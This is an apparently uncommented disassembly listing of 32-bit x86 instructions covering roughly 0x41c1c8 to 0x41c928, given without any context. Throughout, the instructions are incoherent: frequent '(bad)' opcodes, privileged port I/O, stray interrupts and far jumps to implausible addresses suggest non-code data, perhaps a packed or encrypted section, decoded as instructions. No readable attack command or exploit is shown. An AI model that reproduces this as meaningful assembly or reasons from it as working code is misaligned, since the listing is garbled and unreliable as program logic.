  41c1c8:	fdivr  QWORD PTR [edi+0x54]
  41c1cb:	aaa    
  41c1cc:	and    dl,0xdb
  41c1cf:	mov    dl,BYTE PTR [eax-0x64]
  41c1d2:	int    0x5d
  41c1d4:	clc    
  41c1d5:	out    dx,al
  41c1d6:	das    
  41c1d7:	xor    eax,0xb43bd4a1
  41c1dc:	sbb    edx,DWORD PTR [esi+0x52]
  41c1df:	and    edi,edi
  41c1e1:	icebp  
  41c1e2:	adc    edi,edx
  41c1e4:	inc    ebx
  41c1e5:	nop
  41c1e6:	sub    ch,BYTE PTR [esi]
  41c1e8:	sub    eax,0x67074e7b
  41c1ed:	dec    esp
  41c1ee:	xchg   edi,eax
  41c1ef:	dec    esp
  41c1f0:	cwde   
  41c1f1:	inc    ecx
  41c1f2:	lods   al,BYTE PTR ds:[esi]
  41c1f3:	adc    BYTE PTR [edx-0x38dd65a],dl
  41c1f9:	jae    0x41c19c
  41c1fb:	arpl   WORD PTR [esi-0x48],cx
  41c1fe:	leave  
  41c1ff:	and    BYTE PTR [ecx-0x7de6496],dh
  41c205:	mov    bl,0xbc
  41c207:	jg     0x41c1ad
  41c209:	mov    bl,0x25
  41c20b:	daa    
  41c20c:	std    
  41c20d:	mov    WORD PTR [esi-0x30d6c9dd],ss
  41c213:	stos   BYTE PTR es:[edi],al
  41c214:	pop    esi
  41c215:	cmp    BYTE PTR ss:[eax+ecx*8-0x4a],0x10
  41c21b:	dec    edi
  41c21c:	mov    bl,0xec
  41c21e:	jae    0x41c22c
  41c220:	out    0x6c,al
  41c222:	adc    edi,DWORD PTR [edx-0x4f93eaac]
  41c228:	enter  0x1d3b,0x35
  41c22c:	popa   
  41c22d:	cmp    al,0xbd
  41c22f:	jns    0x41c290
  41c231:	mov    cs,ebx
  41c233:	adc    DWORD PTR [esi+0x5b],esp
  41c236:	inc    edx
  41c237:	jle    0x41c280
  41c239:	fisttp WORD PTR [edi-0x1614f45c]
  41c23f:	xor    al,0x35
  41c241:	sbb    esp,edx
  41c243:	(bad)  
  41c244:	fbstp  TBYTE PTR [eax*2-0x430afeb4]
  41c24b:	push   ecx
  41c24c:	mov    ah,0x34
  41c24e:	add    bh,BYTE PTR [ebx]
  41c250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c251:	(bad)  
  41c252:	xor    al,BYTE PTR [ebx+0x15f23129]
  41c258:	push   edx
  41c259:	jne    0x41c1f9
  41c25b:	fucomp st(2)
  41c25d:	jnp    0x41c235
  41c25f:	xchg   esi,eax
  41c260:	or     bh,BYTE PTR [esi]
  41c262:	xor    bh,BYTE PTR [edx+0x44d5ef33]
  41c268:	mov    eax,ds:0x751c0eaa
  41c26d:	sbb    ebx,DWORD PTR [ecx-0x7d]
  41c270:	sub    eax,0x3aa91bc0
  41c275:	or     eax,0xcf384196
  41c27a:	pop    edi
  41c27b:	pop    ebx
  41c27c:	ins    DWORD PTR es:[edi],dx
  41c27d:	and    DWORD PTR [edx-0x6e],esi
  41c280:	in     al,0xb4
  41c282:	int3   
  41c283:	sbb    BYTE PTR ds:0xfa7cc8bc,ch
  41c289:	clc    
  41c28a:	xor    DWORD PTR [edx+0x37],ebx
  41c28d:	aad    0xb4
  41c28f:	int    0xd2
  41c291:	push   0xfffffffa
  41c293:	xchg   esp,eax
  41c294:	shr    edx,cl
  41c296:	test   al,0x16
  41c298:	jbe    0x41c29b
  41c29a:	shl    DWORD PTR [ecx],1
  41c29c:	push   ecx
  41c29d:	sbb    esi,edx
  41c29f:	pop    ecx
  41c2a0:	mov    al,0x75
  41c2a2:	or     al,0x41
  41c2a4:	data16 adc dh,ah
  41c2a7:	loope  0x41c268
  41c2a9:	jbe    0x41c232
  41c2ab:	sar    DWORD PTR [eax],cl
  41c2ad:	add    BYTE PTR [edx],ch
  41c2af:	jmp    0x41c2ed
  41c2b1:	imul   edi,DWORD PTR [ebp-0x4f],0x42ddedaa
  41c2b8:	or     ebx,DWORD PTR [ebx+0x1d1d8fa7]
  41c2be:	push   ebp
  41c2bf:	cwde   
  41c2c0:	adc    DWORD PTR [edi+0xf],esi
  41c2c3:	iret   
  41c2c4:	mov    dh,0x56
  41c2c6:	ins    DWORD PTR es:[edi],dx
  41c2c7:	dec    esp
  41c2c8:	jmp    0x9257fcce
  41c2cd:	cli    
  41c2ce:	scas   al,BYTE PTR es:[edi]
  41c2cf:	xchg   esi,eax
  41c2d0:	adc    esp,DWORD PTR [ecx*8-0x2e623fe7]
  41c2d7:	mov    ds:0x90f8ea2f,eax
  41c2dc:	add    BYTE PTR [edi],al
  41c2de:	lock jbe 0x41c31e
  41c2e1:	push   ds
  41c2e2:	dec    eax
  41c2e3:	(bad)  
  41c2e4:	dec    eax
  41c2e5:	inc    edi
  41c2e6:	adc    eax,0x1aa1c89d
  41c2eb:	dec    DWORD PTR [ebx*4+0x421799a3]
  41c2f2:	and    DWORD PTR [ecx+eax*2-0x39787b9c],edi
  41c2f9:	push   ebx
  41c2fa:	mov    cl,dl
  41c2fc:	call   0x6f2943e8
  41c301:	test   eax,0xb629113a
  41c306:	popa   
  41c307:	lock add eax,0xd9e748cd
  41c30d:	idiv   bl
  41c30f:	popf   
  41c310:	inc    eax
  41c311:	popa   
  41c312:	sar    BYTE PTR [ebp+0xcb96863],cl
  41c318:	xor    esi,DWORD PTR [edi+0x5d6e5ae6]
  41c31e:	mov    ebx,0xf2aa8590
  41c323:	pop    es
  41c324:	dec    edi
  41c325:	(bad)  
  41c327:	popf   
  41c328:	sti    
  41c329:	int3   
  41c32a:	rol    BYTE PTR [edi],0x5b
  41c32d:	cmp    al,0x8c
  41c32f:	sahf   
  41c330:	push   cs
  41c331:	rcr    BYTE PTR [eax-0xf],0x7f
  41c335:	push   ds
  41c336:	push   esi
  41c337:	popa   
  41c338:	mov    BYTE PTR [ebp+0x31e7463f],bl
  41c33e:	mov    ds:0x64655a6a,al
  41c343:	jp     0x41c316
  41c345:	jnp    0x41c35a
  41c347:	das    
  41c348:	dec    bp
  41c34a:	pop    ebx
  41c34b:	jne    0x41c3a1
  41c34d:	faddp  st(6),st
  41c34f:	mov    edi,0x521282d7
  41c354:	fisttp WORD PTR [ebp+0x3e506fc2]
  41c35a:	mov    ds:0xa28aa419,eax
  41c35f:	mov    ch,dl
  41c361:	sub    DWORD PTR [ebx],edi
  41c363:	cmc    
  41c364:	mov    al,ds:0x12257d3e
  41c369:	push   ds
  41c36a:	dec    ebp
  41c36b:	(bad)  [ebp-0x2b]
  41c36e:	test   al,0x27
  41c370:	lods   eax,DWORD PTR ds:[esi]
  41c371:	mov    ecx,0x2e8baf19
  41c376:	gs dec edx
  41c378:	dec    ecx
  41c379:	xor    eax,0xc6082491
  41c37e:	xchg   esp,eax
  41c37f:	cdq    
  41c380:	and    al,0x4a
  41c382:	jb     0x41c359
  41c384:	test   eax,0xb6a660b3
  41c389:	retf   0xcbaf
  41c38c:	gs xor al,0x67
  41c38f:	stc    
  41c390:	jle    0x41c39c
  41c392:	or     bh,BYTE PTR [eax+0x64013533]
  41c398:	fmul   st,st(3)
  41c39a:	pop    esp
  41c39b:	popa   
  41c39c:	lods   eax,DWORD PTR ds:[esi]
  41c39d:	and    ecx,DWORD PTR [esi-0x37]
  41c3a0:	fcmove st,st(0)
  41c3a2:	jbe    0x41c338
  41c3a4:	dec    eax
  41c3a5:	cmp    DWORD PTR [eax],0x7d044792
  41c3ab:	cmp    DWORD PTR [ebx+0x74a19c1b],ebx
  41c3b1:	dec    ebx
  41c3b2:	enter  0xd142,0x84
  41c3b6:	jns    0x41c398
  41c3b8:	dec    ebp
  41c3b9:	adc    bl,BYTE PTR [ebx+0x7c]
  41c3bc:	dec    esi
  41c3bd:	stc    
  41c3be:	pop    ss
  41c3bf:	out    dx,eax
  41c3c0:	mov    esi,cs
  41c3c2:	lahf   
  41c3c3:	leave  
  41c3c4:	dec    eax
  41c3c5:	push   edx
  41c3c6:	rcl    DWORD PTR [edx-0xe86f20d],1
  41c3cc:	jmp    0x41c358
  41c3ce:	ja     0x41c3f8
  41c3d0:	retf   0x493d
  41c3d3:	neg    DWORD PTR [esi+0x366a2561]
  41c3d9:	jne    0x41c3ce
  41c3db:	gs jecxz 0x41c39d
  41c3de:	adc    DWORD PTR [ebx+0x5],0x5
  41c3e2:	ret    
  41c3e3:	rcr    DWORD PTR [eax-0x3c],1
  41c3e6:	sti    
  41c3e7:	mov    eax,DWORD PTR [edx-0x6d5bf68e]
  41c3ed:	ja     0x41c38d
  41c3ef:	dec    eax
  41c3f0:	add    DWORD PTR [ebx+0x51dfa07d],ecx
  41c3f6:	sub    ebp,ecx
  41c3f8:	or     BYTE PTR [edx],dh
  41c3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3fb:	mov    DWORD PTR [esi+edx*1-0x51],ecx
  41c3ff:	and    eax,ecx
  41c401:	stos   BYTE PTR es:[edi],al
  41c402:	adc    cl,BYTE PTR [esi-0x57]
  41c405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c406:	addr16 lock das 
  41c409:	cmp    al,0xbf
  41c40b:	and    DWORD PTR [esi],esp
  41c40d:	cdq    
  41c40e:	adc    al,BYTE PTR [ebp+0x72dd9d52]
  41c414:	adc    ch,ch
  41c416:	or     eax,DWORD PTR [ebp+0x798f0ca5]
  41c41c:	out    0x3f,eax
  41c41e:	jle    0x41c3a3
  41c420:	in     eax,dx
  41c421:	pop    ecx
  41c422:	pop    esp
  41c423:	push   esi
  41c424:	stos   BYTE PTR es:[edi],al
  41c425:	xchg   esi,eax
  41c426:	aaa    
  41c427:	test   BYTE PTR [edi],ah
  41c429:	mov    eax,gs
  41c42b:	pop    esi
  41c42c:	adc    ebx,ecx
  41c42e:	shl    BYTE PTR [ecx-0x1ce7312d],1
  41c434:	mov    edi,0xabcf33c6
  41c439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c43a:	pop    edx
  41c43b:	mov    ebp,0xaa3ac4f0
  41c440:	fist   WORD PTR [esp+edi*8-0xa988689]
  41c447:	adc    eax,0xec51b545
  41c44c:	mov    edi,0xd9889297
  41c451:	mov    eax,0x23286ff2
  41c456:	xchg   ebp,eax
  41c457:	imul   edi,DWORD PTR [eax-0x52606b48],0x4b
  41c45e:	sub    ebp,ecx
  41c460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c461:	data16 outs dx,BYTE PTR ds:[esi]
  41c463:	dec    esp
  41c464:	(bad)  
  41c465:	enter  0x227f,0xca
  41c469:	loopne 0x41c48c
  41c46b:	mov    ch,0x2a
  41c46d:	jmp    0x4c4f69b9
  41c472:	push   edi
  41c473:	in     eax,dx
  41c474:	and    ebx,0x5c
  41c477:	mov    ecx,0x5ab1924d
  41c47c:	fisubr DWORD PTR [edi]
  41c47e:	mov    edi,0x65f5a879
  41c483:	(bad)  
  41c484:	pop    ss
  41c485:	xor    al,0x90
  41c487:	mov    esi,0x8dada9bb
  41c48c:	xor    al,0x44
  41c48e:	xchg   ebp,eax
  41c48f:	stos   BYTE PTR es:[edi],al
  41c490:	mov    al,0x51
  41c492:	fidiv  DWORD PTR [ebx+edx*4-0x1b]
  41c496:	outs   dx,BYTE PTR ds:[esi]
  41c497:	iret   
  41c498:	pop    ss
  41c499:	icebp  
  41c49a:	dec    ebp
  41c49b:	sub    eax,0xad572676
  41c4a0:	loope  0x41c458
  41c4a2:	loop   0x41c4f3
  41c4a4:	aam    0x70
  41c4a6:	or     edx,DWORD PTR [edi+0x45e2843]
  41c4ac:	cmc    
  41c4ad:	lock test BYTE PTR [ebx-0x32],bh
  41c4b1:	mov    ds:0x6413a38e,eax
  41c4b6:	(bad)  
  41c4b8:	out    0x1f,al
  41c4ba:	mov    ah,0xb3
  41c4bc:	xor    ebx,ecx
  41c4be:	imul   DWORD PTR [ebx+ebx*4+0x28]
  41c4c2:	inc    esp
  41c4c3:	fst    DWORD PTR [edi+0xf6635ca]
  41c4c9:	jns    0x41c4dc
  41c4cb:	in     eax,0x89
  41c4cd:	(bad)  
  41c4ce:	cld    
  41c4cf:	push   esp
  41c4d0:	push   ebp
  41c4d1:	or     ebp,0x430f12da
  41c4d7:	cld    
  41c4d8:	xor    esi,DWORD PTR [edi+ebp*8-0x4]
  41c4dc:	test   al,0xaa
  41c4de:	cmp    eax,0xa6a49c7a
  41c4e3:	jns    0x41c4a6
  41c4e5:	push   ss
  41c4e6:	xchg   ebp,eax
  41c4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e8:	sbb    cl,ah
  41c4ea:	pusha  
  41c4eb:	sub    ch,BYTE PTR [edx+0x59de5056]
  41c4f1:	rol    DWORD PTR [edx+0x6ae73c80],1
  41c4f7:	mov    ch,0xc2
  41c4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4fa:	dec    edx
  41c4fb:	icebp  
  41c4fc:	test   ebp,ebx
  41c4fe:	out    dx,eax
  41c4ff:	nop    DWORD PTR [eax+0x1bc3d220]
  41c506:	fild   DWORD PTR [ecx]
  41c508:	aad    0x5f
  41c50a:	jmp    0xbb25a58d
  41c50f:	and    eax,0xe9c1acd5
  41c514:	adc    DWORD PTR [edi+0x29],edx
  41c517:	jmp    0x7328:0x9877a2db
  41c51e:	push   ss
  41c51f:	mov    al,ds:0xca323fb5
  41c524:	addr16 mov dh,0x4
  41c527:	fldcw  WORD PTR [eax]
  41c529:	dec    ebp
  41c52a:	pop    ss
  41c52b:	pop    edi
  41c52c:	(bad)  
  41c52d:	mov    al,0xa6
  41c52f:	(bad)  
  41c530:	in     al,0xfa
  41c532:	into   
  41c533:	lods   eax,DWORD PTR ds:[esi]
  41c534:	push   edx
  41c535:	lock pop ebp
  41c537:	daa    
  41c538:	jg     0x41c4e3
  41c53a:	fwait
  41c53b:	out    0x7f,al
  41c53d:	jne    0x41c537
  41c53f:	test   al,0xd6
  41c541:	lea    eax,[eax+esi*1-0x78d0c9fa]
  41c548:	cs jl  0x41c571
  41c54b:	fild   DWORD PTR [eax+0x1e72cfce]
  41c551:	test   edi,ebp
  41c553:	cmp    edx,DWORD PTR [ecx+0x27]
  41c556:	je     0x41c54f
  41c558:	xchg   edx,eax
  41c559:	cwde   
  41c55a:	aam    0x40
  41c55c:	sahf   
  41c55d:	repz and edi,0xffffffe9
  41c561:	mov    ds:0x57b4c931,al
  41c566:	test   BYTE PTR [edi+0x3c],bl
  41c569:	xchg   DWORD PTR [edx],esi
  41c56b:	fild   QWORD PTR ds:0x3a2ba249
  41c571:	push   ss
  41c572:	repnz scas eax,DWORD PTR es:[edi]
  41c574:	mov    al,ds:0x532b33fb
  41c579:	pop    es
  41c57a:	jbe    0x41c5dd
  41c57c:	daa    
  41c57d:	outs   dx,BYTE PTR ds:[esi]
  41c57e:	(bad)  
  41c57f:	fstp   TBYTE PTR [ebx-0x53]
  41c582:	jl     0x41c5c2
  41c584:	fs enter 0x22e7,0x5
  41c589:	call   0xed0c167c
  41c58e:	(bad)  
  41c58f:	aas    
  41c590:	call   0x622b208
  41c595:	inc    ebx
  41c596:	pop    esp
  41c597:	clc    
  41c598:	and    eax,0x750dcf30
  41c59d:	push   ss
  41c59e:	mov    dl,0x95
  41c5a0:	rcl    bh,cl
  41c5a2:	cmp    DWORD PTR [ebx],0xffffffcf
  41c5a5:	jne    0x41c587
  41c5a7:	and    eax,0x352e945b
  41c5ac:	jmp    0x41c5db
  41c5ae:	add    esi,DWORD PTR [ecx-0x62]
  41c5b1:	pop    ebp
  41c5b2:	cmp    dl,cl
  41c5b4:	inc    edi
  41c5b5:	mov    al,ds:0x54e3e9cc
  41c5ba:	jbe    0x41c590
  41c5bc:	xchg   edx,eax
  41c5bd:	iret   
  41c5be:	outs   dx,DWORD PTR ds:[esi]
  41c5bf:	scas   eax,DWORD PTR es:[edi]
  41c5c0:	fidiv  WORD PTR [esi-0x78]
  41c5c3:	add    BYTE PTR [ebp-0x3a],bh
  41c5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5c7:	mov    edi,0xfa44cb4
  41c5cc:	out    dx,al
  41c5cd:	inc    ebp
  41c5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5cf:	cmp    al,0x11
  41c5d1:	push   esp
  41c5d2:	fsub   DWORD PTR [ecx+esi*2+0x3d]
  41c5d6:	scas   eax,DWORD PTR es:[edi]
  41c5d7:	in     al,0x4e
  41c5d9:	int    0x53
  41c5db:	out    0x1c,eax
  41c5dd:	mov    esi,0xed94dc27
  41c5e2:	pushf  
  41c5e3:	fwait
  41c5e4:	inc    edi
  41c5e5:	push   esp
  41c5e6:	push   ss
  41c5e7:	sub    cl,ch
  41c5e9:	fadd   DWORD PTR [ecx]
  41c5eb:	push   ebx
  41c5ec:	loop   0x41c64e
  41c5ee:	and    eax,DWORD PTR [esi-0x250f3153]
  41c5f4:	pop    eax
  41c5f5:	sbb    eax,0x19553a42
  41c5fa:	push   edi
  41c5fb:	mov    BYTE PTR [ecx],ch
  41c5fd:	sbb    ebp,DWORD PTR gs:[ecx]
  41c600:	hlt    
  41c601:	xor    DWORD PTR [edi],ebx
  41c603:	inc    ebp
  41c604:	call   0x1321:0xfa9a128f
  41c60b:	fidiv  DWORD PTR [ecx-0x2299d235]
  41c611:	enter  0xc109,0xf8
  41c615:	out    dx,al
  41c616:	cmp    ebx,DWORD PTR [edi-0x7d]
  41c619:	mov    ebp,0x33724a13
  41c61e:	js     0x41c63d
  41c620:	mov    bl,0xaf
  41c622:	les    ecx,FWORD PTR [eax-0x5a]
  41c625:	je     0x41c61c
  41c627:	adc    eax,0xb644cb84
  41c62c:	stc    
  41c62d:	stos   BYTE PTR es:[edi],al
  41c62e:	adc    BYTE PTR [eax+esi*8],al
  41c631:	cld    
  41c632:	xor    eax,0x97cafb7d
  41c637:	in     al,dx
  41c638:	push   cs
  41c639:	mov    bh,0x7f
  41c63b:	cmp    ecx,0x52
  41c63e:	dec    ebp
  41c63f:	stos   DWORD PTR es:[edi],eax
  41c640:	rcl    ecx,1
  41c642:	int    0x9c
  41c644:	mov    eax,0x2d44aae7
  41c649:	imul   edx,DWORD PTR [eax],0x92885193
  41c64f:	and    eax,DWORD PTR [esp+esi*1+0x56a016c4]
  41c656:	inc    esp
  41c657:	data16 out 0xe8,al
  41c65a:	aad    0xcd
  41c65c:	in     eax,0xb4
  41c65e:	ret    
  41c65f:	cdq    
  41c660:	or     DWORD PTR [ecx+0x512aba42],ebx
  41c666:	in     eax,dx
  41c667:	cmp    al,0x30
  41c669:	into   
  41c66a:	scas   eax,DWORD PTR es:[edi]
  41c66b:	cs (bad) 
  41c66d:	arpl   WORD PTR [ebx-0x2c8aec9],bp
  41c673:	je     0x41c639
  41c675:	mov    al,ds:0x66fbe4c8
  41c67a:	push   ebp
  41c67b:	inc    ebp
  41c67c:	mov    dh,dl
  41c67e:	mov    al,0xbe
  41c680:	neg    al
  41c682:	mov    ecx,0x86c47cc8
  41c687:	std    
  41c688:	pop    eax
  41c689:	pop    esi
  41c68a:	xchg   edx,eax
  41c68b:	jns    0x41c630
  41c68d:	jno    0x41c628
  41c68f:	dec    edi
  41c690:	jno    0x41c710
  41c692:	js     0x41c6dd
  41c694:	int    0xb0
  41c696:	mov    ebp,0x30c8187
  41c69b:	lahf   
  41c69c:	std    
  41c69d:	sub    DWORD PTR [ecx-0x16bc464f],esp
  41c6a3:	jmp    0x41c6cd
  41c6a5:	push   ecx
  41c6a6:	and    al,BYTE PTR [edx+0x70c4d005]
  41c6ac:	sbb    eax,DWORD PTR [ecx+eax*2]
  41c6af:	lods   al,BYTE PTR ds:[esi]
  41c6b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6b1:	xor    al,0x79
  41c6b3:	ror    DWORD PTR [esi],0x2b
  41c6b6:	xchg   ebx,eax
  41c6b7:	(bad)  
  41c6b8:	cwde   
  41c6b9:	stc    
  41c6ba:	sti    
  41c6bb:	fwait
  41c6bc:	jne    0x41c733
  41c6be:	xor    eax,0x5f86ca21
  41c6c3:	adc    eax,0x45d1ae99
  41c6c8:	jmp    0xfa7:0xd0f51f7e
  41c6cf:	and    DWORD PTR ds:0x42c4dcb8,edi
  41c6d5:	jg     0x41c716
  41c6d7:	sub    DWORD PTR [esi],eax
  41c6d9:	scas   al,BYTE PTR es:[edi]
  41c6da:	adc    eax,0x6c46b43f
  41c6df:	sub    dh,BYTE PTR [edi-0x3c]
  41c6e2:	(bad)  
  41c6e3:	cmp    al,0x6c
  41c6e5:	lds    esp,FWORD PTR [esi+0x64]
  41c6e8:	ss jmp 0x41c74c
  41c6eb:	mov    eax,ds:0x2167b16a
  41c6f0:	mov    esi,0xd969f4e4
  41c6f5:	mov    dh,0x65
  41c6f7:	inc    ebx
  41c6f8:	add    al,ch
  41c6fa:	das    
  41c6fb:	cwde   
  41c6fc:	push   eax
  41c6fd:	out    dx,al
  41c6fe:	sbb    BYTE PTR [ecx+0x2e],0xdd
  41c702:	pop    esp
  41c703:	add    eax,0x24e45e0e
  41c708:	outs   dx,DWORD PTR ds:[esi]
  41c709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c70a:	mov    DWORD PTR [ebx+0x53c7bdea],0xa0ac7cb4
  41c714:	mov    bh,0xcf
  41c716:	test   DWORD PTR ds:0x65236c6b,esp
  41c71c:	inc    edx
  41c71d:	sbb    eax,0xc6d731b0
  41c722:	mov    ch,0xe9
  41c724:	add    eax,0x45382383
  41c729:	or     eax,0x4b04bea8
  41c72e:	push   es
  41c72f:	retf   0x52f0
  41c732:	aas    
  41c733:	sub    al,0xd8
  41c735:	push   cs
  41c736:	in     eax,0xdc
  41c738:	mov    esp,0xbb9bdbb2
  41c73d:	push   edi
  41c73e:	mov    dl,0xe2
  41c740:	pop    ecx
  41c741:	(bad)  
  41c742:	inc    ebp
  41c743:	lahf   
  41c744:	pop    DWORD PTR [ecx]
  41c746:	cld    
  41c747:	jo     0x41c7bb
  41c749:	push   ss
  41c74a:	inc    esi
  41c74b:	mov    edx,0xf419ef92
  41c750:	xor    eax,0x99cfa684
  41c755:	stos   BYTE PTR es:[edi],al
  41c756:	repz clc 
  41c758:	jmp    0x41c70d
  41c75a:	mov    edx,0x5198e5a0
  41c75f:	repnz sbb edi,DWORD PTR [esi]
  41c762:	push   edx
  41c763:	bound  eax,QWORD PTR [edi+0x77]
  41c766:	out    dx,eax
  41c767:	and    eax,DWORD PTR [esp+edx*2+0x46]
  41c76b:	aas    
  41c76c:	mov    ebx,0x85661ff7
  41c771:	sar    ecx,cl
  41c773:	enter  0x6f29,0xee
  41c777:	fsub   DWORD PTR [eax]
  41c779:	ins    DWORD PTR es:[edi],dx
  41c77a:	icebp  
  41c77b:	xchg   ebp,eax
  41c77c:	jnp    0x41c716
  41c77e:	imul   eax,DWORD PTR [edx+edx*4-0x685d5cd8],0xa
  41c786:	adc    dh,BYTE PTR [ebx]
  41c788:	lods   eax,DWORD PTR ds:[esi]
  41c789:	adc    ch,ch
  41c78b:	dec    ecx
  41c78c:	inc    edx
  41c78d:	pusha  
  41c78e:	mov    esi,0xe06393bd
  41c793:	pop    es
  41c794:	daa    
  41c795:	adc    DWORD PTR [esi+eiz*1+0x78],ebx
  41c799:	retf   0x4f71
  41c79c:	mov    ecx,0x967e7546
  41c7a1:	mov    al,ds:0x9559de79
  41c7a6:	mov    ds:0x454720d6,eax
  41c7ab:	mov    ds:0xdbab48fc,al
  41c7b0:	mov    ecx,0x76a07a0
  41c7b5:	push   esi
  41c7b6:	mov    ds:0x53085964,eax
  41c7bb:	scas   eax,DWORD PTR es:[edi]
  41c7bc:	push   ds
  41c7bd:	ins    BYTE PTR es:[edi],dx
  41c7be:	mov    eax,DWORD PTR [ebx-0x40]
  41c7c1:	retf   0xa1df
  41c7c4:	les    ebx,FWORD PTR [ecx-0x68]
  41c7c7:	repz inc ebx
  41c7c9:	rol    DWORD PTR [edx-0x14],0x4a
  41c7cd:	jae    0x41c829
  41c7cf:	and    bx,WORD PTR ds:0xad966abc
  41c7d6:	mov    esi,0x3cb0921d
  41c7db:	jmp    0x41c856
  41c7dd:	add    BYTE PTR [edx+edx*2],ch
  41c7e0:	ret    0xdcf9
  41c7e3:	loop   0x41c766
  41c7e5:	pop    eax
  41c7e6:	mov    DWORD PTR ds:0xe18fddb,eax
  41c7ec:	or     BYTE PTR [ebp-0x4e],cl
  41c7ef:	mov    al,0xaa
  41c7f1:	ins    DWORD PTR es:[edi],dx
  41c7f2:	jae    0x41c7d2
  41c7f4:	mov    DWORD PTR [ebx+0x42],esi
  41c7f7:	xchg   ebp,eax
  41c7f8:	add    eax,0x6bdcec89
  41c7fd:	pop    eax
  41c7fe:	imul   edi,DWORD PTR [ebx],0xfb15f30f
  41c804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c805:	inc    esi
  41c806:	mov    DWORD PTR [ecx+0x3d67e4ff],esp
  41c80c:	lea    ebp,[ebp-0x7a]
  41c80f:	sub    edi,esi
  41c811:	repz push edx
  41c813:	cld    
  41c814:	mov    dh,0x93
  41c816:	arpl   WORD PTR [eax+0x3b76b67f],si
  41c81c:	or     BYTE PTR [esi-0x122b9503],bl
  41c822:	nop
  41c823:	mov    ebp,0x2adfc6b4
  41c828:	or     ecx,ecx
  41c82a:	dec    ebp
  41c82b:	shl    BYTE PTR [esi],cl
  41c82d:	jmp    0x41c86c
  41c82f:	mov    edi,0x3eeadd57
  41c834:	jg     0x41c7c5
  41c836:	scas   al,BYTE PTR es:[edi]
  41c837:	inc    edx
  41c838:	dec    eax
  41c839:	pop    ss
  41c83a:	sub    al,0xd1
  41c83c:	dec    edx
  41c83d:	loope  0x41c8a1
  41c83f:	int3   
  41c840:	cs clc 
  41c842:	rcl    BYTE PTR [esi],cl
  41c844:	sub    BYTE PTR [ebp+0x22f5aaba],bh
  41c84a:	inc    esp
  41c84b:	lods   al,BYTE PTR ds:[esi]
  41c84c:	ss call 0x1e3fa3c7
  41c852:	outs   dx,DWORD PTR ds:[esi]
  41c853:	jno    0x41c850
  41c855:	cmp    dh,dh
  41c857:	(bad)  
  41c859:	mov    ah,0x47
  41c85b:	push   eax
  41c85c:	repz lock clc 
  41c85f:	dec    ecx
  41c860:	xlat   BYTE PTR ds:[ebx]
  41c861:	or     BYTE PTR gs:[edi+0x56],0x10
  41c866:	ins    DWORD PTR es:[edi],dx
  41c867:	adc    BYTE PTR [esp+eax*1-0x5988d59c],dh
  41c86e:	inc    di
  41c870:	mov    ss,ecx
  41c872:	scas   eax,DWORD PTR es:[edi]
  41c873:	ds push edx
  41c875:	scas   al,BYTE PTR es:[edi]
  41c876:	push   ebx
  41c877:	pop    esp
  41c878:	(bad)  
  41c879:	aam    0x70
  41c87b:	sub    ecx,DWORD PTR [ebp+0x1fb9c808]
  41c881:	cmp    eax,0x422ff066
  41c886:	arpl   WORD PTR [ebx-0x85181e9],dx
  41c88c:	clc    
  41c88d:	push   es
  41c88e:	fcomi  st,st(7)
  41c890:	imul   BYTE PTR [esi]
  41c892:	jae    0x41c864
  41c894:	cmp    cl,BYTE PTR [ebx+0x7bad3b2a]
  41c89a:	vandnps xmm2,xmm0,xmm0
  41c89e:	push   esp
  41c89f:	adc    BYTE PTR [ecx-0x1b],0xf4
  41c8a3:	les    edi,FWORD PTR [ebp+edi*1-0x30]
  41c8a7:	or     DWORD PTR [edx],ebp
  41c8a9:	call   0x39f0:0xb1f55d92
  41c8b0:	pushf  
  41c8b1:	icebp  
  41c8b2:	loope  0x41c838
  41c8b4:	scas   al,BYTE PTR es:[edi]
  41c8b5:	xchg   ebx,eax
  41c8b6:	adc    al,0xa3
  41c8b8:	xlat   BYTE PTR ds:[ebx]
  41c8b9:	xchg   esi,eax
  41c8ba:	dec    edi
  41c8bb:	inc    esp
  41c8bc:	in     al,0x30
  41c8be:	fidiv  DWORD PTR [ecx-0x2]
  41c8c1:	push   esi
  41c8c2:	sbb    DWORD PTR [edx+0x40],edx
  41c8c5:	aas    
  41c8c6:	retf   
  41c8c7:	(bad)  
  41c8c8:	push   ds
  41c8c9:	jnp    0x41c8db
  41c8cb:	scas   eax,DWORD PTR es:[edi]
  41c8cc:	push   esi
  41c8cd:	(bad)  
  41c8ce:	and    al,0xce
  41c8d0:	leave  
  41c8d1:	scas   al,BYTE PTR es:[edi]
  41c8d2:	out    dx,eax
  41c8d3:	or     bh,BYTE PTR [eax]
  41c8d5:	lock (bad) 
  41c8d7:	dec    ecx
  41c8d8:	jno    0x41c951
  41c8da:	int    0xc6
  41c8dc:	jns    0x41c8f5
  41c8de:	jnp    0x41c93e
  41c8e0:	mov    ebp,0x9ed480bc
  41c8e5:	fwait
  41c8e6:	test   eax,0xbe7bc070
  41c8eb:	(bad)  
  41c8ec:	dec    esi
  41c8ed:	(bad)  
  41c8ee:	ss sub eax,0xe6d4792c
  41c8f4:	adc    bl,BYTE PTR [esi]
  41c8f6:	adc    esi,esi
  41c8f8:	push   ecx
  41c8f9:	imul   ebx,DWORD PTR [ecx-0x15ce45c9],0x5e5316cf
  41c903:	jbe    0x41c972
  41c905:	aad    0x1a
  41c907:	xchg   edi,eax
  41c908:	test   eax,0x56ea6da1
  41c90d:	jnp    0x41c955
  41c90f:	push   ss
  41c910:	stos   DWORD PTR es:[edi],eax
  41c911:	addr16 xchg esp,eax
  41c913:	cld    
  41c914:	sbb    al,0xd2
  41c916:	lea    esp,[edx-0x13b67c42]
  41c91c:	xchg   DWORD PTR [eax+0x55cf9372],ebp
  41c922:	aas    
  41c923:	mov    al,0x74
  41c925:	xlat   BYTE PTR ds:[ebx]
  41c926:	jge    0x41c987
  41c928:	jne    0x41c98e
